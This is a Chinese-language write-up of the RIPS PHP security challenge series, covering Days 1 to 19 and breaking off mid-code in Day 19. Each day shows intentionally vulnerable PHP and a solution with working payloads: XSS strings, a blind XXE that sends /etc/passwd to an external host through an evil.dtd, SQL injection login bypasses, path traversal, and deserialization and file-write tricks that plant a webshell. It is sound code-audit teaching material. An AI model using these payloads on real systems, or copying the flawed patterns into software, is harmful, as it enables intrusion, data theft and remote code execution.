由于ripstech是从实际的程序中抽离出来的代码，导致部分代码在实际部署的过程中需要一些上下文环境。所以我在进行实际的测试过程中，为了能够更好地说明问题，对其中的部分代码进行了修改。。
## 目录
- [Day 1 - White List](#day-1---white-list)
- [Day 2 - Twig](#day-2---twig)
- [Day 3 - Snow Flake](#day-3---snow-flake)
- [Day 4 - False Beard](#day-4---false-beard)
- [Day 5 - Postcard](#day-5---postcard)
- [Day 6 - Frost Pattern](#day-6---frost-pattern)
- [Day 7 - Bells](#day-7---bells)
- [Day 8 - Candle](#day-8---candle)
- [Day 9 - Rabbit](#day-9---rabbit)
- [Day 10 - Anticipation](#day-10---anticipation)
- [Day 11 - Pumpkin Pie](#day-11---pumpkin-pie)
- [Day 12 - String Lights](#day-12---string-lights)
- [Day 13 - Turkey Baster](#day-13---turkey-baster)
- [Day 14 - Snowman](#day-14---snowman)
- [Day 15 - Sleigh Ride](#day-15---sleigh-ride)
- [Day 16 - Poem](#day-16---poem)
- [Day 17 - Mistletoe](#day-17---mistletoe)
- [Day 18 - Sign](#day-18---sign)
- [Day 19 - Birch](#day-19---birch)
- [Day 20 - Stocking](#day-20---stocking)
- [Day 21 - Gift Wrap](#day-21---gift-wrap)
- [Day 22 - Chimney](#day-22---chimney)
- [Day 23 - Cookies](#day-23---cookies)
- [Day 24 - Nutcracker](#day-24---nutcracker)

## Day 1 - White List
### 题目
```PHP
class Challenge {
    const UPLOAD_DIRECTORY = 'path/to/solution';
    private $file;
    private $whitelist;

    public function __construct($file) {
        $this->file = $file;
        $this->whitelist = range(1, 24);
    }

    public function __destruct() {
        if (in_array($this->file['name'], $this->whitelist)) {
            move_uploaded_file(
                $this->file['tmp_name'],
                self::UPLOAD_DIRECTORY . $this->file['name']
            );
        }
    }
}
if(isset($_POST['submit'])) {
    $challenge = new Challenge($_FILES['solution']);
}
?>
<form action="" method="post" enctype="multipart/form-data">
    <label for="file">Filename:</label>
    <input type="file" name="solution" id="file" />
    <br />
    <input type="submit" name="submit" value="Submit" />
</form>
```
### 解答
in_array()的第三个参数在默认情况下是`false`,此时会进行类型转换。如下所示:
```PHP
$myarray = range(1,24); 
in_array('5backdoor',$myarray);         //true         
in_array('5backdoor',$myarray,true);    //false
```
所以如果我上传类似于`5backdoor.php`的文件名就可以绕过检查，所以这就是一个任意文件上传的漏洞。

[返回目录](#目录)

## Day 2 - Twig
### 题目
```PHP
require 'vendor/autoload.php';

class Template {
    private $twig;

    public function __construct() {
        $indexTemplate = '<img ' .
            'src="https://loremflickr.com/320/240">' .
            '<a href="{{link|escape}}">Next slide »</a>';

        // Default twig setup, simulate loading
        // index.html file from disk
        $loader = new Twig_loader_Array(['index.html' => $indexTemplate]);
        $this->twig = new Twig_Environment($loader);
    }

    public function getNexSlideUrl() {
        $nextSlide = $_GET['nextSlide'];
        return filter_var($nextSlide, FILTER_VALIDATE_URL);
    }

    public function render() {
        echo $this->twig->render(
            'index.html',
            ['link' => $this->getNexSlideUrl()]
        );
    }
}

(new Template())->render();
```
### 解答
本题目中使用了`Twig`,这是一个国外的PHP模板引擎，从功能看和Smarty的功能类似。

分析程序，在程序中使用两个过滤，分别是`filter_var($nextSlide, FILTER_VALIDATE_URL)`过滤为URL以及`Twig`中的`{{link|escape}}`的转义。通过题目分析，这个应该是XSS漏洞，触发应该是借助于`href`事件完成，那么问题在于就需要绕过`filter_var`和转义了。

`filter_var`的URL过滤非常的弱，只是单纯的从形式上检测并没有检测协议。测试如下：
```PHP
var_dump(filter_var('example.com', FILTER_VALIDATE_URL));           # false
var_dump(filter_var('http://example.com', FILTER_VALIDATE_URL));    # http://example.com
var_dump(filter_var('xxxx://example.com', FILTER_VALIDATE_URL));    # xxxx://example.com
var_dump(filter_var('http://example.com>', FILTER_VALIDATE_URL));   # false
```
所以虽然`filter_var`不检查协议，但是输入的URL还是要保证是URL的形式。

`Twig`中的`{{link|escape}}`中的escape的和PHP中的`htmlspecialchars($link, ENT_QUOTES, 'UTF-8')`是一样的，所以单引号和双引号等都无法使用了。那么最后我们的payload就可以是：
```
javascript://comment%250aalert(1)
```
通过`javascript://comment`绕过`filter_var`，最后得到`javascript://comment%0aalert()`进入到`<a href="{{link|escape}}">Next slide »</a>`刚好能够触发alert。

[返回目录](#目录)

## Day 3 - Snow Flake
### 题目
```PHP
function __autoload($className) {
    include $className;
}

$controllerName = $_GET['c'];
$data = $_GET['d'];

if (class_exists($controllerName)) {
    $controller = new $controllerName($data);
    $controller->render();
} else {
    echo 'There is no page with this name';
}

class HomeController {
    private $data;

    public function __construct($data) {
        $this->data = $data;
    }

    public function render() {
        if ($this->data['new']) {
            echo 'controller rendering new response';
        } else {
            echo 'controller rendering old response';
        }
    }
}
```
### 解答
在第8行中的`class_exists()`会检查是否存在对应的类，当调用`class_exists()`函数时会触发用户定义的`__autoload()`函数，用于加载找不到的类。关于`class_exist()`和`__autoload()`的用法，可以参考[stackoverflow:class_exists&autoload](https://stackoverflow.com/questions/3812851/there-is-a-way-to-use-class-exists-and-autoload-without-crash-the-script)。
除此之外，还有很多的函数在调用`__autoload()`的方法，如下：
```PHP
call_user_func()
call_user_func_array()
class_exists()
class_implements()
class_parents()
class_uses()
get_class_methods()
get_class_vars()
get_parent_class()
interface_exists()
is_a()
is_callable()
is_subclass_of()
method_exists()
property_exists()
spl_autoload_call()
trait_exists()
```
所以如果我们输入`../../../../etc/passwd`是，就会调用`class_exists()`，这样就会触发`__autoload()`,这样就是一个任意文件包含的漏洞了，这个漏洞在`PHP 5.4`中已经被修复了。

除了这个问题之外，还存在一个`blind xxe`的漏洞，由于存在`class_exists()`，所以我们可以调用PHP的内置函数,并且通过`$controller = new $controllerName($data);`进行实例化。但是这样又如何造成漏洞呢?这个时候就需要借助与PHP中的`SimpleXMLElement`类来完成XXE攻击。关于这个攻击手法，可以参见[shopware blind xxe](https://blog.ripstech.com/2017/shopware-php-object-instantiation-to-blind-xxe/)和[我是如何黑掉“Pornhub”来寻求乐趣和赢得10000$的奖金](http://bobao.360.cn/learning/detail/3082.html)。其中都有讲到利用`SimpleXMLElement`类实施XXE漏洞。那么在本例中，我们实施blind XXE也是十分的简单。
访问攻击页面：
```
http://localhost/risp/xxe/test2.php?c=SimpleXMLElement&d=<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % remote SYSTEM "http://外网地址/evil.dtd">
%remote;
%send;
]>
```
其中的`evil.dtd`内容是:
```XML
<!ENTITY % all
        "<!ENTITY &#x25; send SYSTEM '外网地址/1.php?file=%file;'>"
        >
        %all;
```
其中的`1.php`的地址是：
```PHP
file_put_contents("result.txt", $_GET['file']);
```
这样就完成了攻击。

[返回目录](#目录)

## Day 4 - False Beard
### 题目
```PHP
class Login {
    public function __construct($user, $pass) {
        $this->loginViaXml($user, $pass);
    }

    public function loginViaXml($user, $pass) {
        if (
            (!strpos($user, '<') || !strpos($user, '>')) &&
            (!strpos($pass, '<') || !strpos($pass, '>'))
        ) {
            $format = '<xml><user="%s"/><pass="%s"/></xml>';
            $xml = sprintf($format, $user, $pass);
            $xmlElement = new SimpleXMLElement($xml);
            // Perform the actual login.
            $this->login($xmlElement);
        }
    }
}

new Login($_POST['username'], $_POST['password']);
```
### 解答
虽然这道题目出现了`XML`，但是考察的确实`strpos`的用法和PHP的自动类型转换的问题。分别说明：
```PHP
var_dump(strpos('abcd','a'));       # 0
var_dump(strpos('abcd','x'));       # false
```
但是由于PHP的自动类型转换的关系，`0`和`false`是相等的，如下：
```PHP
var_dump(0==false);         # true
```
所以如果我们传入的`username`和`password`的首位字符是`<`或者是`>`就可以绕过限制，那么最后的pyaload就是：
```
username=<"><injected-tag%20property="&password=<"><injected-tag%20property="
```
最终传入到`$this->login($xmlElement)`的`$xmlElement`值是`<xml><user="<"><injected-tag property=""/><pass="<"><injected-tag property=""/></xml>`这样就可以进行注入了。

[返回目录](#目录)

## Day 5 - Postcard
### 题目
```PHP
class Mailer {
    private function sanitize($email) {
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return '';
        }

        return escapeshellarg($email);
    }

    public function send($data) {
        if (!isset($data['to'])) {
            $data['to'] = 'none@ripstech.com';
        } else {
            $data['to'] = $this->sanitize($data['to']);
        }

        if (!isset($data['from'])) {
            $data['from'] = 'none@ripstech.com';
        } else {
            $data['from'] = $this->sanitize($data['from']);
        }

        if (!isset($data['subject'])) {
            $data['subject'] = 'No Subject';
        }

        if (!isset($data['message'])) {
            $data['message'] = '';
        }

        mail($data['to'], $data['subject'], $data['message'],
             '', "-f" . $data['from']);
    }
}

$mailer = new Mailer();
$mailer->send($_POST);
```
### 解答
这个漏洞其实就是`mail()`函数的漏洞，我们同样需要通过`mail()`中的第五个参数以`-X`的方式写入webshell。但是中途进行了两次过滤，分别是`filter_var($email, FILTER_VALIDATE_EMAIL)`和`escapeshellarg($email)`。我们接下来分别分析这两个过滤函数。
- `filter_var()`函数的过滤过滤，可以参考这篇文章[PHP FILTER_VALIDATE_EMAIL](https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly)，其中说明了`none of the special characters in this local part are allowed outside quotation marks`,表示所有的特殊符号必须放在双引号中。`filter_var`问题在于，我们能够在双引号中嵌套转义空格仍然能够通过检测。同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗`filter_val`使其认为我们仍然在双引号中，我们就可以绕过检测。如下：
```PHP
var_dump(filter_var('\'is."\'\ not\ allowed"@example.com',FILTER_VALIDATE_EMAIL));      # true
var_dump(filter_var('"is.\ not\ allowed"@example.com',FILTER_VALIDATE_EMAIL));          # true
var_dump(filter_var('"is.""\ not\ allowed"@example.com',FILTER_VALIDATE_EMAIL));        # false
```

escapeshellarg，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号。如下：
```PHP
var_dump(escapeshellarg("123"));            # '123'
var_dump(escapeshellarg("12'  3"));         # '12'\''  3'
```
前面说到`filter`会混淆单双引号，但是`escapeshellarg()`并不会混淆单双引号，如下：
```PHP
var_dump(escapeshellarg("'is.\"'\ not\ allowed\"@example.com"));        # ''\''is."'\''\ not\ allowed"@example.com'
```
关于mail()函数的漏洞，rips的这篇文章[Why mail() is dangerous in PHP](https://blog.ripstech.com/2017/why-mail-is-dangerous-in-php) 说明得十分清除，其中对于`escapeshellarg()`和`filter_var()`不安全的问题进行了说明。在国内[PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)对`escapeshellarg`和`escapeshellcmd`联合使用从而造成的安全问题也进行了说明。这两篇文章都值得收藏。

[返回目录](#目录)

## Day 6 - Frost Pattern
### 题目
```PHP
class TokenStorage {
    public function performAction($action, $data) {
        switch ($action) {
            case 'create':
                $this->createToken($data);
                break;
            case 'delete':
                $this->clearToken($data);
                break;
            default:
                throw new Exception('Unknown action');
        }
    }

    public function createToken($seed) {
        $token = md5($seed);
        file_put_contents('/tmp/tokens/' . $token, '...data');
    }

    public function clearToken($token) {
        $file = preg_replace("/[^a-z.-_]/", "", $token);
        unlink('/tmp/tokens/' . $file);
    }
}

$storage = new TokenStorage();
$storage->performAction($_GET['action'], $_GET['data']);
```
### 解答
本题的问题是在于`clearToken()`中的正则表达式`[^a-z.-_]`。按照代码的本意是，是将非`a-z`、`.`、`-`、`_`全部替换为空。这样`../../../`目录穿越的方式就无法使用了，因为`/`会被替换为空。

但是本题的问题在于`[^a-z.-_]`中的`-`没有进行转义。如果`-`没有进行转义，那么`-`表示一个列表，例如`[1-9]`表示的数字1到9，但是如果`[1\-9]`表示就是字母`1`、`-`和`9`。所以在本题中使用的`[^a-z.-_]`表示的就是非ascii表中的序号为46至122的字母替换为空。那么此时的`../.../`就不会被匹配，就可以进行目录穿越，从而造成任意文件删除了。

最后的pyload可以写为：`action=delete&data=../../config.php`

[返回目录](#目录)

## Day 7 - Bells
### 题目
```PHP
function getUser($id) {
    global $config, $db;
    if (!is_resource($db)) {
        $db = new MySQLi(
            $config['dbhost'],
            $config['dbuser'],
            $config['dbpass'],
            $config['dbname']
        );
    }
    $sql = "SELECT username FROM users WHERE id = ?";
    $stmt = $db->prepare($sql);
    $stmt->bind_param('i', $id);
    $stmt->bind_result($name);
    $stmt->execute();
    $stmt->fetch();
    return $name;
}

$var = parse_url($_SERVER['HTTP_REFERER']);
parse_str($var['query']);
$currentUser = getUser($id);
echo '<h1>'.htmlspecialchars($currentUser).'</h1>';
```
### 解答
看到了`parse_str`就知道这是一个变量覆盖的漏洞。同时`$_SERVER['HTTP_REFERER']`也是可控的，那么就存在变量覆盖的漏洞了。

通过变量覆盖漏洞，我们可以覆盖掉`$config`，使其在我们构造的数据库中进行查询，这样就能够保证我们能够顺利地进行通过验证。

最后的payload如下：``http://host/?config[dbhost]=10.0.0.5&config[dbuser]=root&config[dbpass]=root&config[dbname]=malicious&id=1`

[返回目录](#目录)

## Day 8 - Candle
### 题目
```PHP
header("Content-Type: text/plain");
function complexStrtolower($regex, $value) {
    return preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value);
}

foreach ($_GET as $regex => $value) {
    echo complexStrtolower($regex, $value) . "\n";
}
```
### 解答
这道题目也十分的简单，出现了`preg_replace('/e','')`这种代码，`preg_replace`在`/e`模式下能够执行代码如下：
```PHP
preg_replace('/(.*)/e','phpinfo();','xxx');
```
这样就能够执行`phpinfo()`。在本题中，我们可以控制`regex`和`value`。但是本题的关键是在于有`strtolower()`，虽然如此但是`strtolower("\\1")`使用的是双引号，这样就可以利用php中的`"`能够执行代码的特性了。最简单的php中双引号的代码执行，如下：
```PHP
"{${phpinfo()}}";
```
那么本题的最后的payload可以写为`/?.*={${phpinfo()}}`

但是这样写是存在问题的，因为在传送请求时,`.`会被替换为`_`，所以最后的请求名和参数是:
```
_*={${phpinfo()}}`
```
这样就无法进行替换了。那么我们最后的payload就可以变通地写为`/?{\${\w*\(\)}}={${phpinfo()}}`

[返回目录](#目录)

## Day 9 - Rabbit
### 题目
```PHP
class LanguageManager
{
    public function loadLanguage()
    {
        $lang = $this->getBrowserLanguage();
        $sanitizedLang = $this->sanitizeLanguage($lang);
        require_once("/lang/$sanitizedLang");
    }

    private function getBrowserLanguage()
    {
        $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en';
        return $lang;
    }

    private function sanitizeLanguage($language)
    {
        return str_replace('../', '', $language);
    }
}

(new LanguageManager())->loadLanguage();
```
### 解答
这个题目是一个比较明显的任意文件包含的漏洞，主要的漏洞是出在`str_replace('../', '', $language)`。这个包含只是单次替换而不是循环替换，所以这种替换就很容易被绕过。如`..././`、`....//`。其次`$_SERVER['HTTP_ACCEPT_LANGUAGE']`这个变量是客户端可控的。

那么最后的请求的payload如下：
```
Accept-Language:  .//....//....//etc/passwd
```
[返回目录](#目录)

## Day 10 - Anticipation
### 题目
```PHP
$pi = extract($_POST);
function goAway() {
    error_log("Hacking attempt.");
    header('Location: /error/');
}

if (!isset($pi) || !is_numeric($pi)) {
    goAway();
}

if (!assert("(int)$pi == 3")) {
    echo "This is not pi.";
} else {
    echo "This might be pi.";
}
```
### 解答
虽然这道题目存在`extract($_POST);`，但并不存在变量覆盖漏洞。
这个题目存在两个关键的问题：
1. 使用header()进行跳转的时候没有使用`exit()`或者是`die()`，导致后续的代码任然可以执行。
2. `assert()`能够执行`"`中的代码,如`assert("(int)phpinfo()");`

通过这两点就可以造成任意代码执行。payload为`pi=phpinfo()`。通过burp就可以看到phpinfo的返回内容。

[返回目录](#目录)

## Day 11 - Pumpkin Pie
### 题目
```PHP
class Template {
    public $cacheFile = '/tmp/cachefile';
    public $template = '<div>Welcome back %s</div>';

    public function __construct($data = null) {
        $data = $this->loadData($data);
        $this->render($data);
    }

    public function loadData($data) {
        if (substr($data, 0, 2) !== 'O:' 
        && !preg_match('/O:\d:/', $data)) {
            return unserialize($data);
        }
        return [];
    }

    public function createCache($file = null, $tpl = null) {
        $file = $file ?? $this->cacheFile;
        $tpl = $tpl ?? $this->template;
        file_put_contents($file, $tpl);
    }

    public function render($data) {
        echo sprintf(
            $this->template,
            htmlspecialchars($data['name'])
        );
    }

    public function __destruct() {
        $this->createCache();
    }
}

new Template($_COOKIE['data']);
```
### 解答
**源代码中12行存在问题，其中的`O:\d:\{`需要修改为`O:\d:`**

代码中的`??`是php7中新的语法糖。`??`的含义是
>由于日常使用中存在大量同时使用三元表达式和 isset()的情况， 我们添加了null合并运算符 (??) 这个语法糖。如果变量存在且值不为NULL， 它就会返回自身的值，否则返回它的第二个操作数。

这道题目使用了`unserialize()`和`__destruct`，是考察反序列化漏洞的典型套路。题目的本意很简单，将页面上的内容`<div>Welcome back %s</div>`最后输出到`/tmp/cachefile`文件中。而题目最大的问题是需要绕过：
1. `substr($data, 0, 2) !== 'O:'`
2. `preg_match('/O:\d:/', $data)`

第一个通过数组的方式就可以绕过，而第二个的绕过则需要利用到PHP中的反序列化的一个BUG，只需要在对象长度前添加一个+号，即o:14->o:+14，这样就可以绕过正则匹配。关于这个BUG的具体分析，可以参见[php反序列unserialize的一个小特性](http://www.phpbug.cn/archives/32.html)。

知道了漏洞原理，接下来就是构造payload了
```PHP
class Template {
    public $cacheFile = '/var/www/html/info.php';
    public $template = '<?php phpinfo();';
}
$mytemp = new Template();
$myarray = array('name'=>'test',$mytemp);
$myarray = serialize($myarray);
var_dump($myarray);
```
**解答**
得到输出为`a:2:{s:4:"name";s:4:"test";i:0;O:8:"Template":2:{s:9:"cacheFile";s:22:"/var/www/html/info.php";s:8:"template";s:16:"<?php phpinfo();";}}`

由于需要绕过`preg_match('/O:\d:/', $data)`，需要将`0:8`变为`0:+8`,则最后的payload为：
```
a:2:{s:4:"name";s:4:"test";i:0;O:+8:"Template":2:{s:9:"cacheFile";s:22:"/var/www/html/info.php";s:8:"template";s:16:"<?php phpinfo();";}}
```

[返回目录](#目录)

## Day 12 - String Lights
### 题目
```PHP
$sanitized = [];

foreach ($_GET as $key => $value) {
    $sanitized[$key] = intval($value);
}

$queryParts = array_map(function ($key, $value) {
    return $key . '=' . $value;
}, array_keys($sanitized), array_values($sanitized));

$query = implode('&', $queryParts);

echo "<a href='/images/size.php?" .
    htmlentities($query) . "'>link</a>";
```
### 解答
看最后的输出，猜测可能是一个XSS的问题。本题目的关键是在于`$sanitized[$key] = intval($value);`，同时漏洞也是出自于`$sanitized[$key] = intval($value);`。这行代码主要就是的作用就是传入的`$value`进行过滤变为`intval($value)`，之后再次经过`htmlentities`进行过滤拼接到`<a>`标签中作为`/images/size.php`的参数。

上述代码的问题在于：
1. `$sanitized[$key] = intval($value)`只过滤了value，没有对key进行过滤；
2. `htmlentities`默认情况下不会对单引号进行转义。

那么我们的XSS攻击就可以通过在标签`<a>`中增加一个`onclick`的点击事件触发。最后的payload如下`a%27onclick%3Dalert%281%29%2f%2f=c`

[返回目录](#目录)

## Day 13 - Turkey Baster
### 题目
```PHP
class LoginManager {
    private $user;
    private $password;

    public function __construct($user, $password) {
        $this->user = $user;
        $this->password = $password;
    }

    public function isValid() {
        $user = $this->sanitizeInput($this->user);
        $pass = $this->sanitizeInput($this->password);
        
        $sql = "select count(p) from user u where user = '$user' AND password = '$pass'";
        $result =mysql_query($sql);
        return $result;
    }
	
    public function sanitizeInput($input, $length = 20) {
        $input = addslashes($input);
        if (strlen($input) > $length) {
            $input = substr($input, 0, $length);
        }
        return $input;
    }
}

$auth = new LoginManager($_POST['user'], $_POST['passwd']);
if (!$auth->isValid()) {
    exit;
}
```
### 解答
这是一道典型的用户登录的代码，但是本题目的漏洞和阶段注入的漏洞类似。在进行了`addslashes`之后进行了截断，在一些情况下就有可能能够获得一个引号。如下：
```PHP
function sanitizeInput($input, $length = 20) {
    $input = addslashes($input);
    if (strlen($input) > $length) {
        $input = substr($input, 0, $length);
    }
    return $input;
}
$test = "1234567890123456789'";
var_dump(sanitizeInput($test));
```
最终得到的就是`1234567890123456789\`，这样就能够逃逸出一个`\`。在本题中，利用这个逃逸出的单引号，我们就能够绕过验证。
那么我们最终的payload就可以写为如下：
```
user=1234567890123456789'&passwd=or 1=1#
```
那么此时进入到数据库查选的SQL语句是`select count(p) from user u where user = '1234567890123456789\' AND password = 'or 1=1#'`。在此SQL语句中，user值为`1234567890123456789\' AND password = `。这样就能够保证返回的结果是True，如此就能够顺利地通过验证。

[返回目录](#目录)

## Day 14 - Snowman
### 题目
```PHP
class Carrot {
    const EXTERNAL_DIRECTORY = '/tmp/';
    private $id;
    private $lost = 0;
    private $bought = 0;

    public function __construct($input) {
        $this->id = rand(1, 1000);

        foreach ($input as $field => $count) {
            $this->$field = $count++;
        }
    }

    public function __destruct() {
        file_put_contents(
            self::EXTERNAL_DIRECTORY . $this->id,
            var_export(get_object_vars($this), true)
        );
    }
}

$carrot = new Carrot($_GET);
```
### 解答
这道题目的危害是任意文件写，可以导致getshell。这到题目的问题有：
1. `foreach ($input as $field => $count) {$this->$field = $count++;}`存在变量覆盖漏洞；
2. `var_export(get_object_vars($this), true)`不会进行1任何的转义。

在说明这个题目之前，先看看php中的`++`的行为：
```PHP
$test=123; echo $test++;  # 123
```
所以，如果变量直接自增，则结果是不会发生变化的。如果在题目中的`$count++`并不会对结果有任何的改变。同时`$this->$field`我们可以对`Carrot`实例的任何属性进行修改。例如我们的payload为`id=../../var/www/html/shell.php`,最后就能够覆盖到原先的变量的值，最终就能向`/var/ww/html/shell.php`进行写入了。

第二个问题是如何写入shell。这个问题也十分的简单。通过`var_export(get_object_vars($this), true)`会获取示例的所有的属性，那么我们就可以构造属性进行写入。例如我们利用PHP中的`"`能够执行代码的特点，构造如`"<?php phpinfo();>"`，我们的payload如下：
```URL
id=../../var/www/html/test/shell.php&t1=1%22%3C%3Fphp%20phpinfo%28%29%3F%3E%224
```
当程序运行至`__destruct`时：
1. `self::EXTERNAL_DIRECTORY . $this->id`变为`/tmp/../../var/www/html/test/shell.php`
2. `var_export(get_object_vars($this), true)`变为
    ```PHP
    array (
    'id' => '../../var/www/html/test/shell.php',
    'lost' => 0,
    'bought' => 0,
    't1' => '1"<?php phpinfo()?>"4',
    )
    ```
当这样就顺利地在`test/shell.php`下写入了webshell。

### 其他
本题目的很大问题是在于其中`$count++`并不会对结果有任何的影响，但是如果是`++$count`呢？
```
$test = 123; echo ++$test;      // 124
$test = '123'; echo ++$test;    // 124
$test = '1ab'; echo ++$test;    // '1ac'
$test = 'ab1'; echo ++$test;    // 'ab2'
$test = 'a1b'; echo ++$test;    // 'a1c'
$test =array(2,'name'=>'wyj'); echo ++$test;    //Array123
```
通过分析发现，在进行`++`操作时会进行隐式类型转换，如果能够转换成功，则会进行加法操作；如果不能转换成功，则将最后一个字符进行加法操作。

如果本题的代码修改为:
```PHP
foreach ($input as $field => $count) {
    $this->$field = ++$count;
}
```
那么我们的payload就可以有以下的方式:
1. `id=../../var/www/html/test/shell.php4&t1=1%22%3C%3Fphp%20phpinfo%28%29%3F%3E%224`，使用`php4`进行自增操作之后变为`php5`仍然能够执行。
2. `id=../../var/www/html/test/shell.pho&t1=1%22%3C%3Fphp%20phpinfo%28%29%3F%3E%224`,`pho`进过自增操作之后就会变为`php`

[返回目录](#目录)

## Day 15 - Sleigh Ride
### 题目
```PHP
class Redirect {
    private $websiteHost = 'www.example.com';

    private function setHeaders($url) {
        $url = urldecode($url);
        header("Location: $url");
    }

    public function startRedirect($params) {
        $parts = explode('/', $_SERVER['PHP_SELF']);
        $baseFile = end($parts);
        $url = sprintf(
            "%s?%s",
            $baseFile,
            http_build_query($params)
        );
        $this->setHeaders($url);
    }
}

if ($_GET['redirect']) {
    (new Redirect())->startRedirect($_GET['params']);
}
```
本题目是一个任意路径跳转漏洞，题目本意是跳转至本网站的其他路径但是由于存在漏洞却可以跳转至任意其他的网站。题目的代码意思是取`$_SERVER['PHP_SELF']`中最后的一个路径与参数中的`params`值进行拼接，得到最终的跳转路径。

对于拼接得到的URL还使用了` $url = urldecode($url);`进行解码操作。那么我们就需要对我们的URL`www.domain.com`进行二次编码。那么不编码或者是编码一次可以吗？
1. 如果不编码呢，`index.php/http://www.domain.com?redirect=1`,那么通过`$baseFile = end($parts);`得到是`www.domain.com`,最后拼接的URL是`www.domain.com?`,这样最终跳转的路径是`header('www.domain.com?')`，还是在本网站内。所以如果需要跳转至其他的网站就必须带上`http`.
2. 如果是一次编码呢？`index.php/http%3A%2f%2fwww.domain.com?redirect=1`,会出现`The requested URL /risp/day15.php/http://www.domain.com was not found on this server.`的错误。

**关于这两者为什么会存在差异，目前还不是很清楚**

进行二次编码之后，`index.php/http%253A%252f%252fwww.domain.com?redirect=1`,经过`$baseFile = end($parts);`得到的就是`http%3A%2f%2fwww.domain.com`。最后进入到`$url = urldecode($url);header("Location: $url");`，最终跳转的目录就是`http://www.domain.com?`,这样就可以完成任意网站的跳转了。

[返回目录](#目录)

## Day 16 - Poem
### 题目
```PHP
class FTP {
    public $sock;

    public function __construct($host, $port, $user, $pass) {
        $this->sock = fsockopen($host, $port);

        $this->login($user, $pass);
        $this->cleanInput();
        $this->mode($_REQUEST['mode']);
        $this->send($_FILES['file']);
    }

    private function cleanInput() {
        $_GET = array_map('intval', $_GET);
        $_POST = array_map('intval', $_POST);
        $_COOKIE = array_map('intval', $_COOKIE);
    }

    public function login($username, $password) {
        fwrite($this->sock, "USER " . $username);
        fwrite($this->sock, "PASS " . $password);
    }

    public function mode($mode) {
        if ($mode == 1 || $mode == 2 || $mode == 3) {
            fputs($this->sock, "MODE $mode");
        }
    }

    public function send($data) {
        fputs($this->sock, $data);
    }
}

new FTP('localhost', 21, 'user', 'password');
```
### 解答
这到题目存在两个漏洞，分别是出自于`$_REQUEST`以及`==`的问题。首先说明`$_REQUEST`的问题，根据php手册上面的说明：
>由于 $_REQUEST 中的变量通过 GET，POST 和 COOKIE 输入机制传递给脚本文件，因此可以被远程用户篡改而并不可信。

这话是什么意思呢?表示的是`$_REQUEST`是直接从GET，POST 和 COOKIE中取值，不是他们的引用。即使后续`GET，POST 和 COOKIE`发生了变化，也不会影响`$_REQUEST`的结果。如下:
```PHP
$_GET = array_map('intval', $_GET);
var_dump($_GET);
var_dump($_REQUEST);
```
访问U`index.php?t1=1abc`
得到的结果如下：
```
test.php:2:
array (size=1)
  't1' => int 1

test.php:3:
array (size=1)
  't1' => string '1abc' (length=4)
```
可以看到虽然`$_GET`发生了变化，但是`$_REQUEST`仍然是没有变化的。那么在本题中可以看到虽然前面使用了`cleanInput()`进行过滤，但是后面取值时又从`$_REQUEST`中取值，那么这也就表示之前的`cleanInput()`是无用的。

之后的问题是在于`mode()`函数，其中仅仅只是使用了`==`。`==`的问题是在于进行比较时会进行隐式类型转换，如`1=='1ab'`就是相等的。那么在本题中我们就可以利用`$_REQUEST`和`==`的这两个特性造成任意文件删除的操作。最后的payload为:`1%0a%0dDELETE%20test.file`。

[返回目录](#目录)

## Day 17 - Mistletoe
### 题目
```PHP
class RealSecureLoginManager {
    private $em;
    private $user;
    private $password;

    public function __construct($user, $password) {
        $this->em = DoctrineManager::getEntityManager();
        $this->user = $user;
        $this->password = $password;
    }

    public function isValid() {
        $pass = md5($this->password, true);
        $user = $this->sanitizeInput($this->user);

        $queryBuilder = $this->em->createQueryBuilder()
            ->select("COUNT(p)")
            ->from("User", "u")
            ->where("password = '$pass' AND user = '$user'");
        $query = $queryBuilder->getQuery();
        return boolval($query->getSingleScalarResult());
    }

    public function sanitizeInput($input) {
        return addslashes($input);
    }
}

$auth = new RealSecureLoginManager(
    $_POST['user'],
    $_POST['passwd']
);
if (!$auth->isValid()) {
    exit;
}
```
### 解答
这道题目是第13题的升级版本，我们知道在13题中主要是利用了`addslashes`和字符串截断的方式所造成的`\`逃逸从而形成的注入。本题最终的目的还是形成SQL注入从而进行任意账户登录。本题的关键问题是在于`md5($this->password, true);`。php手册中对于`flag`的说明如下：
>如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。

以一个例子进行说明:
```PHP
var_dump(md5('1'));             # c4ca4238a0b923820dcc509a6f75849b
var_dump(md5('1',True));        # ��B8��#��P�ou��
```
设置了`true`之后就会和预期的输出有所差异。如果我们能够保证最后经过`md5($this->password, true);`最后的字符串是`\`，那么最后的sql语句就是`select count(p) from user s where password='xxxxxx\' and user='payload#'`，此时我们只需要设置好user的值就可以完成注入了。通过fuzz，我们发现`md5(128,true)`得到的是`v�an���l���q��\`。这种问题之前在CTF中也偶尔可以见到。

最后我们的payload可以写为`passwd=128&user=' or 1%23`

[返回目录](#目录)

## Day 18 - Sign
### 题目
```PHP
class JWT {
    public function verifyToken($data, $signature) {
        $pub = openssl_pkey_get_public("file://pub_key.pem");
        $signature = base64_decode($signature);
        if (openssl_verify($data, $signature, $pub)) {
            $object = json_decode(base64_decode($data));
            $this->loginAsUser($object);
        }
    }
}

(new JWT())->verifyToken($_GET['d'], $_GET['s']);
```
### 解答
本题目的问题是在于`openssl_verify()`的错误使用，根据php手册说明
>Returns 1 if the signature is correct, 0 if it is incorrect, and -1 on error

在错误的情况下会返回`-1`。但是在`if`判断中得到的结果是True，if判断只有遇到`0`或者是`false`返回的才是`false`。所以如果能够使得`openssl_verify()`出错返回`-1`就能够绕过验证。

如果让`openssl_verify()`出错呢？我们使用一个其他的`pub_key.pem`来生成`data`和`signature`,这样就可以使得`openssl_verify()`返回-1。在本题中既然已经知道了`openssl_verify()`返回结果，我们可以使用`if(openssl_verify()===1)`来避免被绕过。

[返回目录](#目录)

## Day 19 - Birch
```PHP
class ImageViewer {
    private $file;

    function __construct($file) {
        $this->file = "images/$file";
        $this->createThumbnail();
    }

    function createThumbnail() {
        $e = stripcslashes(
            preg_replace(
                '/[^0-9\\\]/',
                '',
                isset($_GET['size']) ? $_GET['size'] : '25'
            )
        );
